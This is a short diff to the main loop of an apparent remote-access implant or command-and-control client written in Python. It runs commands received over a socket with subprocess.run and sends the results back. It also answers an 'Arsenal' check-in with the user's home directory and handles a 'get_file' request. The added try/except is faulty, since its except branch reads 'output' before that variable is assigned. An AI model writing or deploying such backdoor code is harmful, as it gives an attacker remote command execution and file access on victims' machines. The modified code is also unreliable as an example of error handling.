@@ -35,9 +35,12 @@ def main():
             if 'cmd' in command:
                 del command[0]
                 print(command)
-                output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                print(output.stderr)
-                sendit(s, output.stdout + output.stderr)
+                try:
+                    output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                except:
+                    print(output.stderr)
+                    continue
+                sendit(s, output.stdout)
             elif 'Arsenal' in command:
                 sendit(s, 'Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME'))
             elif 'get_file' in command:
